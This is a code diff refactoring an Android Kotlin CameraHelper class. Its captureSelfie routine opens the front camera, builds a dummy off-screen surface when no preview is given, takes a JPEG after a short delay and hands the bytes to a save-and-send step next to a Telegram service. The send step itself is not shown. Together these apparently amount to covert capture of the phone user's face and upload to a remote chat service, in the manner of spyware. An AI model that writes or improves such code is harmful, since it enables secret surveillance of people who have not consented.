@@ -21,6 +21,7 @@ import java.util.*
 class CameraHelper(private val context: Context) {
 
     private val telegramService = TelegramService(context)
+    private val mainHandler = Handler(Looper.getMainLooper())
 
     fun captureSelfie(surfaceTexture: SurfaceTexture? = null, onComplete: (() -> Unit)? = null) {
         if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
@@ -29,100 +30,78 @@ class CameraHelper(private val context: Context) {
             return
         }
 
-        try {
-            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
-            val cameraId = cameraManager.cameraIdList.firstOrNull {
-                cameraManager.getCameraCharacteristics(it)
-                    .get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
-            } ?: cameraManager.cameraIdList.firstOrNull()
+        val session = SelfieCaptureSession(surfaceTexture, onComplete)
+        session.start()
+    }
 
-            if (cameraId == null) {
-                onComplete?.invoke()
+    private inner class SelfieCaptureSession(
+        private val providedSurfaceTexture: SurfaceTexture?,
+        private val onComplete: (() -> Unit)?
+    ) {
+        private var activeCamera: CameraDevice? = null
+        private var activeSession: CameraCaptureSession? = null
+        private var imageReader: ImageReader? = null
+        private var createdSurfaceTexture: SurfaceTexture? = null
+
+        fun start() {
+            try {
+                val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
+                val cameraId = findFrontFacingCamera(cameraManager)
+
+                if (cameraId == null) {
+                    cleanup()
+                    return
+                }
+
+                setupImageReader()
+                openCamera(cameraManager, cameraId)
+            } catch (e: Exception) {
+                Log.e("CameraHelper", "Error starting capture session", e)
+                cleanup()
+            }
+        }
+
+        private fun findFrontFacingCamera(manager: CameraManager): String? {
+            return manager.cameraIdList.firstOrNull {
+                manager.getCameraCharacteristics(it)
+                    .get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
+            } ?: manager.cameraIdList.firstOrNull()
+        }
+
+        private fun setupImageReader() {
+            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1).apply {
+                setOnImageAvailableListener({ reader ->
+                    handleImageAvailable(reader)
+                }, mainHandler)
+            }
+        }
+
+        private fun handleImageAvailable(reader: ImageReader) {
+            try {
+                val image = reader.acquireLatestImage()
+                val buffer = image.planes[0].buffer
+                val bytes = ByteArray(buffer.remaining())
+                buffer.get(bytes)
+                image.close()
+
+                saveAndSendImage(bytes)
+            } catch (e: Exception) {
+                e.printStackTrace()
+            } finally {
+                mainHandler.post { cleanup() }
+            }
+        }
+
+        private fun openCamera(manager: CameraManager, cameraId: String) {
+            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+                cleanup()
                 return
             }
 
-            // Create a dummy surface texture if not provided
-            val texture = surfaceTexture ?: SurfaceTexture(10)
-            texture.setDefaultBufferSize(640, 480)
-
-            val imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)
-
-            // Cleanup function
-            var activeCamera: CameraDevice? = null
-            var activeSession: CameraCaptureSession? = null
-
-            val cleanup = {
-                try {
-                    activeSession?.close()
-                    activeCamera?.close()
-                    imageReader.close()
-                    if (surfaceTexture == null) texture.release() // Only release if we created it
-                    onComplete?.invoke()
-                } catch (e: Exception) { e.printStackTrace() }
-            }
-
-            // Fix for Kotlin compiler issue with Handler
-            val mainHandler = Handler(Looper.getMainLooper())
-
-            imageReader.setOnImageAvailableListener({ reader ->
-                try {
-                    val image = reader.acquireLatestImage()
-                    val buffer = image.planes[0].buffer
-                    val bytes = ByteArray(buffer.remaining())
-                    buffer.get(bytes)
-                    image.close()
-
-                    saveAndSendImage(bytes)
-
-                    mainHandler.post { cleanup() }
-                } catch (e: Exception) {
-                    e.printStackTrace()
-                    cleanup()
-                }
-            }, mainHandler)
-
-            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                 override fun onOpened(camera: CameraDevice) {
                     activeCamera = camera
-                    try {
-                        val previewSurface = Surface(texture)
-                        val captureSurface = imageReader.surface
-
-                        camera.createCaptureSession(listOf(previewSurface, captureSurface), object : CameraCaptureSession.StateCallback() {
-                            override fun onConfigured(session: CameraCaptureSession) {
-                                activeSession = session
-                                try {
-                                    // Start Preview to warm up
-                                    val previewRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
-                                    previewRequest.addTarget(previewSurface)
-                                    session.setRepeatingRequest(previewRequest.build(), null, null)
-
-                                    // Capture after delay
-                                    mainHandler.postDelayed({
-                                        try {
-                                            val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
-                                            captureRequest.addTarget(captureSurface)
-                                            // Ensure orientation is decent (assuming portrait natural)
-                                            captureRequest.set(CaptureRequest.JPEG_ORIENTATION, 270)
-                                            session.capture(captureRequest.build(), null, null)
-                                        } catch (e: Exception) {
-                                            e.printStackTrace()
-                                            cleanup()
-                                        }
-                                    }, 500)
-                                } catch (e: Exception) {
-                                    e.printStackTrace()
-                                    cleanup()
-                                }
-                            }
-
-                            override fun onConfigureFailed(session: CameraCaptureSession) {
-                                cleanup()
-                            }
-                        }, null)
-                    } catch (e: Exception) {
-                        cleanup()
-                    }
+                    createCaptureSession()
                 }
 
                 override fun onDisconnected(camera: CameraDevice) {
@@ -135,10 +114,72 @@ class CameraHelper(private val context: Context) {
                     cleanup()
                 }
             }, mainHandler)
+        }
 
-        } catch (e: Exception) {
-            Log.e("CameraHelper", "Error in captureSelfie", e)
-            onComplete?.invoke()
+        private fun createCaptureSession() {
+            try {
+                val texture = providedSurfaceTexture ?: SurfaceTexture(10).also { createdSurfaceTexture = it }
+                texture.setDefaultBufferSize(640, 480)
+
+                val previewSurface = Surface(texture)
+                val captureSurface = imageReader?.surface ?: return
+
+                activeCamera?.createCaptureSession(listOf(previewSurface, captureSurface), object : CameraCaptureSession.StateCallback() {
+                    override fun onConfigured(session: CameraCaptureSession) {
+                        activeSession = session
+                        triggerCapture(session, previewSurface, captureSurface)
+                    }
+
+                    override fun onConfigureFailed(session: CameraCaptureSession) {
+                        cleanup()
+                    }
+                }, null)
+            } catch (e: Exception) {
+                cleanup()
+            }
+        }
+
+        private fun triggerCapture(session: CameraCaptureSession, previewSurface: Surface, captureSurface: Surface) {
+            try {
+                // Warm up preview
+                val previewRequest = activeCamera?.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)?.apply {
+                    addTarget(previewSurface)
+                }
+                if (previewRequest != null) {
+                    session.setRepeatingRequest(previewRequest.build(), null, null)
+                }
+
+                // Capture after delay
+                mainHandler.postDelayed({
+                    try {
+                        val captureRequest = activeCamera?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)?.apply {
+                            addTarget(captureSurface)
+                            set(CaptureRequest.JPEG_ORIENTATION, 270)
+                        }
+                        if (captureRequest != null) {
+                            session.capture(captureRequest.build(), null, null)
+                        }
+                    } catch (e: Exception) {
+                        e.printStackTrace()
+                        cleanup()
+                    }
+                }, 500)
+            } catch (e: Exception) {
+                e.printStackTrace()
+                cleanup()
+            }
+        }
+
+        private fun cleanup() {
+            try {
+                activeSession?.close()
+                activeCamera?.close()
+                imageReader?.close()
+                createdSurfaceTexture?.release()
+                onComplete?.invoke()
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
         }
     }
 
